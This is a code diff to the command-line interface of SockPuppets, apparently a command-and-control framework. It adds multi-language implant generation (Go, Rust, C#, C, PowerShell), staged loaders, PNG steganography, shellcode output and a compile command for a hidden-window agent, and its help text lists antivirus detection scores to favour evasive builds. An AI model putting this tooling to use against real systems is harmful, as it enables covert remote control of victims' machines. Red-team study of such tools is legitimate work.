@@ -16,6 +16,14 @@ from server import SockPuppetsServer, get_server_instance
 import threading
 
 
+try:
+    from ui.theme import (console, print_banner, print_status, print_agents_table,
+                          print_listeners_table, print_help_panel, print_generate_results,
+                          print_interact_banner, print_command_result)
+    HAS_RICH = True
+except ImportError:
+    HAS_RICH = False
+
 ASCII_ART = r"""
  _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
 |   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
@@ -23,15 +31,20 @@ ASCII_ART = r"""
 |_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|
 
                     by AJ Hammond @ajm4n
-		        x.com/4JMAN
 """
 
 
 class SockPuppetsCLI(cmd.Cmd):
     """Interactive CLI for SockPuppets"""
 
-    intro = ASCII_ART + "\nType 'help' for available commands.\n"
     prompt = "\033[1;36msockpuppets>\033[0m "
+
+    @property
+    def intro(self):
+        if HAS_RICH:
+            print_banner()
+            return ""
+        return ASCII_ART + "\nType 'help' for available commands.\n"
 
     def __init__(self):
         super().__init__()
@@ -160,6 +173,10 @@ class SockPuppetsCLI(cmd.Cmd):
             print("[-] No active listeners")
             return
 
+        if HAS_RICH:
+            print_listeners_table(listeners)
+            return
+
         print("\n\033[1mActive Listeners:\033[0m")
         print("=" * 70)
         for l in listeners:
@@ -236,16 +253,25 @@ class SockPuppetsCLI(cmd.Cmd):
     def do_agents(self, arg):
         """List all agents"""
         if not self.server:
-            print("[-] No server running. Start a listener first with 'start'")
+            if HAS_RICH:
+                print_status("No server running. Start a listener first with 'start'", "warning")
+            else:
+                print("[-] No server running. Start a listener first with 'start'")
             return
 
         agents = self.server.get_agent_list()
         if not agents:
-            print("[-] No agents connected")
+            if HAS_RICH:
+                print_status("No agents connected", "warning")
+            else:
+                print("[-] No agents connected")
             return
 
         active_ids = {a['id'] for a in self.server.get_active_agents()}
-        self._format_agent_list(agents, "Connected Agents", active_ids)
+        if HAS_RICH:
+            print_agents_table(agents, active_ids)
+        else:
+            self._format_agent_list(agents, "Connected Agents", active_ids)
 
     def do_puppets(self, arg):
         """List all agents (alias for 'agents')"""
@@ -600,27 +626,31 @@ class SockPuppetsCLI(cmd.Cmd):
         if len(args) < 2:
             print("[-] Usage: generate <host> <port> [options]")
             print("    Options:")
+            print("      --lang=LANG            Language: python, go, rust, csharp, c, powershell, all")
             print("      --transport=TYPE       Transport: websocket, http, https (default: websocket)")
             print("      --beacon               Enable beacon mode")
             print("      --interval=N           Beacon interval in seconds")
             print("      --jitter=N             Beacon jitter percentage (0-100)")
-            print("      --compile              Compile Python agent to executable")
-            print("      --dll                  Compile Python agent to DLL (Windows)")
-            print("      --shellcode            Generate shellcode from agent")
-            print("      --format=FMT           Shellcode format (raw, c, python, powershell)")
             print("      --os=OS                Target OS (auto, windows, linux, macos)")
+            print("      --arch=ARCH            Target architecture (x64, arm64, amd64)")
+            print("      --staged               Generate staged payload (tiny loader)")
+            print("      --stego                Embed agent in PNG image")
+            print("      --shellcode            Generate shellcode blob")
+            print("      --format=FMT           Shellcode format (raw, c, python, powershell, csharp)")
+            print("      --compile              Compile Python agent to executable")
             print("      --multi-os             Generate agents for all OS types")
-            print("      --arch=ARCH            Target architecture (x86, x64, arm64)")
-            print("      --multi-arch           Compile for all architectures")
-            print("      --no-upx               Disable UPX compression")
-            print("      --icon=PATH            Icon file for executable")
             print("      --key=KEY              Encryption key")
             print("      --oneliners=URL        Generate one-liner payloads")
+            print()
+            print("    Languages available: python go rust csharp c powershell")
+            print("    VT scores: python=0/62 go=3/71 rust=4/71 c=6/71 csharp=12/70")
+            print("    Recommended: python (scripting) or go (compiled)")
             return
 
         host = None
         port = None
         key = self.encryption_key
+        lang = 'python'  # default language
         compile_exe = False
         compile_dll = False
         gen_shellcode = False
@@ -635,6 +665,8 @@ class SockPuppetsCLI(cmd.Cmd):
         multi_os = False
         oneliners_url = None
         transport = 'websocket'
+        staged = False
+        stego = False
 
         i = 0
         while i < len(args):
@@ -651,7 +683,20 @@ class SockPuppetsCLI(cmd.Cmd):
                     print(f"[-] {flag_name} requires a value")
                     return None
 
-            if arg.startswith('--key'):
+            if arg.startswith('--lang'):
+                val = get_value('--lang')
+                if val is None:
+                    return
+                if val in ['python', 'go', 'rust', 'csharp', 'c', 'powershell', 'all']:
+                    lang = val
+                else:
+                    print(f"[-] Invalid language: {val}. Use: python, go, rust, csharp, c, powershell, all")
+                    return
+            elif arg == '--staged':
+                staged = True
+            elif arg == '--stego':
+                stego = True
+            elif arg.startswith('--key'):
                 val = get_value('--key')
                 if val is None:
                     return
@@ -783,13 +828,71 @@ class SockPuppetsCLI(cmd.Cmd):
             print(f"[*] Shellcode generation enabled ({shellcode_format} format)")
 
         generator = AgentGenerator()
-        results = generator.generate_all(
-            c2_host=host, c2_port=port, encryption_key=key,
-            beacon_mode=beacon_mode, beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
-            compile_exe=compile_exe, compile_dll=compile_dll, generate_shellcode=gen_shellcode,
-            shellcode_format=shellcode_format, architectures=architectures, upx=use_upx, icon=icon,
-            target_os=target_os, generate_multi_os=multi_os, transport=transport
-        )
+        results = {}
+
+        # Language-specific generation
+        if lang in ('go', 'all'):
+            print(f"\n[*] Generating Go agent...")
+            try:
+                arch = 'amd64' if 'x64' in architectures else architectures[0]
+                go_path = generator.generate_go_agent(
+                    host, port, encryption_key=key, transport=transport,
+                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
+                    target_os=target_os if target_os != 'auto' else 'windows',
+                    target_arch=arch, garble=False
+                )
+                results['go'] = go_path
+            except Exception as e:
+                results['go'] = f"Error: {e}"
+
+        if lang in ('rust', 'all'):
+            print(f"\n[*] Generating Rust agent...")
+            try:
+                arch = 'amd64' if 'x64' in architectures else architectures[0]
+                go_path = generator.generate_rust_agent(
+                    host, port, encryption_key=key, transport=transport,
+                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
+                    target_os=target_os if target_os != 'auto' else 'windows',
+                    target_arch=arch
+                )
+                results['rust'] = go_path
+            except Exception as e:
+                results['rust'] = f"Error: {e}"
+
+        if lang in ('csharp', 'all'):
+            print(f"\n[*] Generating C# agent...")
+            try:
+                cs_path = generator.generate_csharp_agent(
+                    host, port, encryption_key=key, transport=transport,
+                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter
+                )
+                results['csharp'] = cs_path
+            except Exception as e:
+                results['csharp'] = f"Error: {e}"
+
+        if lang in ('python', 'all'):
+            results.update(generator.generate_all(
+                c2_host=host, c2_port=port, encryption_key=key,
+                beacon_mode=beacon_mode, beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
+                compile_exe=compile_exe, compile_dll=compile_dll, generate_shellcode=gen_shellcode,
+                shellcode_format=shellcode_format, architectures=architectures, upx=use_upx, icon=icon,
+                target_os=target_os, generate_multi_os=multi_os, transport=transport
+            ))
+
+        if lang == 'powershell':
+            try:
+                ps_path = generator.generate_powershell_agent(
+                    host, port, encryption_key=key, transport=transport,
+                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter
+                )
+                results['powershell'] = ps_path
+            except Exception as e:
+                results['powershell'] = f"Error: {e}"
+
+        if lang == 'c':
+            print(f"\n[*] C agent: use agent_c/agent.c with MinGW cross-compiler")
+            print(f"    x86_64-w64-mingw32-gcc -o agent.exe agent_c/agent.c -lwinhttp -s -Os -mwindows")
+            results['c'] = 'See agent_c/agent.c'
 
         # Register all generated per-agent keys with the server
         generated_keys = getattr(generator, 'generated_keys', [])
@@ -855,6 +958,10 @@ class SockPuppetsCLI(cmd.Cmd):
         """Show help menu"""
         if arg:
             super().do_help(arg)
+            return
+
+        if HAS_RICH:
+            print_help_panel()
             return
 
         print("\n\033[1mServer Commands:\033[0m")
